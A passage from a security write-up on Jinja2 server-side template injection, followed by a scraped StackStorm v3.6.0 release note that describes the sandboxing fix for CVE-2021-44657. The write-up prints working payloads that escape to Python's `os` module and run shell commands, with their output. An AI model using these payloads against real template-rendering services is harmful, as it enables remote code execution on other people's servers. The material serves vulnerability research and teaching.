In jinja2 templates, we can use the `TemplateReference` object to reuse code blocks from the template. For example, to avoid rewriting the title all over the template, we can set the title in a block `{% block title%}` and retrieve it with `{{ self.title() }}` later on:

```
>>> msg = jinja2.Template("""
... <title>{% block title %}This is a title{% endblock %}</title>
... <h1>{{ self.title() }}</h1>
... """).render()
>>> print(msg)
<title>This is a title</title>
<h1>This is a title</h1>
>>>

```

We can access the `TemplateReference` object without conditions, even without any variables supplied in the `render()`:

```
>>> jinja2.Template("My name is {{ self }}").render()
'My name is <TemplateReference None>'
>>>

```

We will therefore start from the `TemplateReference` object to build a payload allowing to access the `os` module.

## Building a classic payload

A very classic idea is to use the `TemplateReference` object to access the `__builtins__` and use the `__import__` function to import the module we want directly. To do this, we must first go back to `__globals__` using the classic `self .__ init __.__ globals__` path:

```
>>> jinja2.Template("My name is {{ self.__init__.__globals__ }}").render()

```

By doing this, we get a `dict` containing all the global variables:

![](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/self.__init__.__globals__.png)

In the `__globals__`, we can access Python‚Äôs `__builtins__` functions. This set of functions is included natively in Python without the need for external libraries, and notably contains the `__import__` function. So we can use it directly to import the `os` module like this:

```
>>> jinja2.Template("My name is {{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}").render()
uid=1000(user) gid=1000(user) groups=1000(user)
'My name is 0\n'

```

Here the `system` function of the `os` module allows us to check that we can execute commands, but the result of the command is not reflected in the generated template (only the return code is shown). To return the result of the command, we need to use `os.popen(command).read()` like this:

```
>>> jinja2.Template("My name is {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}").render()
uid=1000(user) gid=1000(user) groups=1000(user)
'My name is uid=1000(user) gid=1000(user) groups=1000(user)\n'

```

And we can now run system commands from a jinja template!

## A context-independent payload

The problem with the previous method is that `__builtins__` are often restricted or filtered. So we have to try to find a module where `os` is already imported, and try to access it. In the source of the `jinja2` module, we see that the `os` module is imported into the `utils.py` file, (So the `os` module is accessible at `jinja2.utils.os`). We can confirm it very simply:

```
>>> import jinja2
>>> jinja2.utils.os
<module 'os' from '/usr/lib/python3.8/os.py'>
>>>

```

If we go back to our `TemplateReference` object presented above, we can find a very interesting internal attribute, `_TemplateReference__context`. This attribute is very interesting because it allows access to three variables `cycler`, `joiner` and `namespace` all present in the `utils.py` file where the `os` module is also imported.

```
>>> jinja2.Template("My name is {{ e(self._TemplateReference__context) }}").render(e=lambda x:vars(x))
"My name is {'parent': {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7f62df526940>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'e': <function <lambda> at 0x7f62de305790>}, 'vars': {}, 'environment': <jinja2.environment.Environment object at 0x7f62dfded040>, 'eval_ctx': <jinja2.nodes.EvalContext object at 0x7f62de22b760>, 'exported_vars': set(), 'name': None, 'blocks': {}}"

```

Once we get to the right submodule, all we have to do is go back to the `__globals__` to directly access the `os` module:

```
>>> jinja2.Template("My name is {{ self._TemplateReference__context.cycler.__init__.__globals__.os }}").render()
"My name is <module 'os' from '/usr/lib/python3.8/os.py'>"

>>> jinja2.Template("My name is {{ self._TemplateReference__context.joiner.__init__.__globals__.os }}").render()
"My name is <module 'os' from '/usr/lib/python3.8/os.py'>"

>>> jinja2.Template("My name is {{ self._TemplateReference__context.namespace.__init__.__globals__.os }}").render()
"My name is <module 'os' from '/usr/lib/python3.8/os.py'>"
>>>

```

Here are 3 context-independent payloads, always allowing access to the `os` module in a template rendered by the jinja2 engine:

```
{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os }}

```
## References

* <https://github.com/pallets/jinja>
* <https://zetcode.com/python/jinja/>
* <https://jinja.palletsprojects.com/en/3.0.x/>
* <https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/>
* <https://0day.work/jinja2-template-injection-filter-bypasses/>
* [https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f](https://medium.com/%40nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f)

√Ç¬©
2024
Podalirius



=== Content from stackstorm.com_84331f48_20250115_093157.html ===

    [![](/wp/wp-content/themes/stackstorm/images/logo_lf_projects_horizontal.png)](https://linuxfoundation.org/projects)
[![StackStorm](/wp/wp-content/uploads/2016/10/StackStorm-logo228.png)](/)

[![StackStorm](/wp/wp-content/uploads/2016/10/StackStorm-logo228.png)](/)

* [Features](/features)
* [Community](/#community)
* [Docs](http://docs.stackstorm.com/)
* [Exchange](https://exchange.stackstorm.org/)
* [Blog](/blog)
* [Donate](/donate/)

# StackStorm v3.6.0 Released

**December 16, 2021**

*by*  *[Marcel Weinberg](https://github.com/winem) and [Aaron Jonen](/2021/12/16/stackstorm-v3-6-0-released/Aaron.jonen%40cypherint.com)*

The new maintenance and security update v3.6.0 has been released!

StackStorm v3.6.0 comes with an important security fix and great improvements for developers and users.

See below, for further information on what‚Äôs included in the release.

## Security fix ‚Äì CVE-2021-44657

In StackStorm versions prior to 3.6.0, the Jinja interpreter was not run in sandbox mode and thus allows execution of unsafe system commands by the st2 users. Updated StackStorm 3.6.0 relies on Jinja sandboxed environment, so that any templates that attempt to access insecure code will be rejected. In order to exploit the vulnerability the attacker must be logged to the stackstorm instance (CLI/API/Web UI/Workflows).

The assigned CVE ID is CVE-2021-44657.

If you are a researcher or user that discovers a security issue, we welcome you to send us a report. See </security/> for more info.

## Service configuration

Previously users needed to edit systemd unit files for each service to update the IP and port. The static .socket systemd units in deb and rpm packages have been replaced with a python-based generator for st2api, st2auth and st2stream. So st2.conf is now the only place to configure the host and port for the st2api, st2auth and st2stream listeners.

## Installers

There is a significant change on the bash installer. Previous releases used the operating systems package repository to install RabbitMQ. As of StackStorm v3.6.0 the installer will always install the latest stable RabbitMQ version from the official RabbitMQ repositories

## CLI & API & UI Changes And Improvements

The security when adding secrets to the kv store has been improved. Now it is possible to add new values to the KV store via the CLI without leaking them to the shell history. To achieve this the user will be prompted for the value if it‚Äôs not already provided.

The new CLI argument  `--remove-files` or just `-r` extends the functionality of the `st2 action delete <pack>.<action>` command and deletes the action database entry along with the corresponding files from disk.

The API action DELETE method now supports `{"remove_files": true}` in the JSON body to delete the database entry along with the files. The default behaviour for both is to keep the files on disk. Therefore this improvement does not come with a breaking change.

In addition there is a new option to delete an action in the Web UI, which will delete from the database and optionally from disk as well.

The `--python3` flag for the st2client was completely removed now.

## StackStorm Code Profiling And Debugging

Two new flags to improve the developer experience have been added to all services. `--enable-profiler` enables cProfiler based profiler for the service and dumps the profiling data to a file on process exit. `--enable-eventlet-blocking-detection` enables eventlet long operation / blocked main loop logic detection and throws an error if a particular code blocks longer than a specific duration in seconds.

Both flags should never be used in production, but only in development environments or similar when profiling or debugging code.

## Other Changes

Additional changes include:

* Minimum TTL on garbage collection for action executions and trigger instances has been reduced from 7 days to 1 day.
* The MongoDB client does not use the deprecated `isMaster` command any longer. This one has been replaced by `ping`.
* `update_executions()` is now atomic by protecting the update with a coordination lock. This improves the reliability of the execution status output especially for the workflows.
* Actionrunners now stop the Kombu consumer thread. This addresses a bug where unhealthy actionrunner pods picked up actions from the queue while they were not able to process them. This improvement ensures that only healthy and running actionrunners or actionrunner pods pick up requested actions from the queue.

Find the full StackStorm/st2 changelog for v3.6.0 [here](https://github.com/StackStorm/st2/blob/master/CHANGELOG.rst#360---october-29-2021).

## Special Thanks

Thanks to [Tomaz](https://github.com/Kami) [Muraus](https://github.com/Kami) for the new flags that will support us in profiling, debugging and improving StackStorm.

Special thanks to *[Amanda McGuinness](https://github.com/amanda11)* of [intive](https://www.intive.com/) for leading the previous Release v3.5.0 and familiarizing me with the release process, her guidance and her efforts improving the installers in various places.

Thanks to [Aaron Jonen](/2021/12/16/stackstorm-v3-6-0-released/Aaron.jonen%40cypherint.com) for being the assistant release manager and supporting me during the release process. Thanks to Eugen and [Jacob Floyd](https://github.com/cognifloyd/) for their guidance and assisting me whenever I had any questions.

We would like to thank everyone who has contributed towards this release. All the improvements would not have been possible without the numerous contributions of our community via Bug reports, feature requests, [Slack](munity.slack.com/), in [GitHub Discussions](https://github.com/StackStorm/st2/discussions) and of course in actual code.

## P.S.

We invite everyone to join the [StackStorm community in Slack](/community-signup) and [Github](https://github.com/StackStorm/)¬† to contribute to the future development of StackStorm. Every contribution, no matter if it‚Äôs a question, an idea for an improvement, a feature or fix to the code or documentation or use-cases and experience shared with the community is highly appreciated!

[Previous Post
StackStorm welcomes Packagecloud as an Infrastructure Partner](/2021/10/11/stackstorm-welcomes-packagecloud-as-a-partner/)
[Next Post
StackStorm 2021 ‚Äì A year in review](/2021/12/29/2021-a-year-in-review/)

[Documentation](http://docs.stackstorm.com/)

[GitHub](https://github.com/StackStorm)

[Community](/#community)

[Security](/security)

[Blog](/blog)

[Video Gallery](https://www.youtube.com/channel/UCColc5CuBJ8-1SnALnkDz8Q)

[Privacy Policy](/privacy-policy)

[Contact](/contact)

¬© 2021 StackStorm a Series of LF Projects, LLC. All rights reserved. For web site terms of use, trademark policy and other project policies please see <https://lfprojects.org/>.

For a list of trademarks of The Linux Foundation, please see our [Trademark Usage](https://www.linuxfoundation.org/trademark-usage) page. Linux is a registered trademark of Linus Torvalds. [Privacy Policy](https://www.linuxfoundation.org/privacy) and [Terms of Use](https://www.linuxfoundation.org/terms).

We use cookies for traffic analytics and ad and content personalization. By clicking on any of the content or interacting with any section of this website,
you are agreeing to this use of cookies in the manner described in our [Privacy Policy](/privacy-policy) close [x]
Privacy & Cookies Policy

Close

#### Privacy Overview

This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may affect your browsing experience.

Necessary

Necessary

Always Enabled

Necessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.

Non-necessary

Non-necessary

Any cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website.

SAVE & ACCEPT


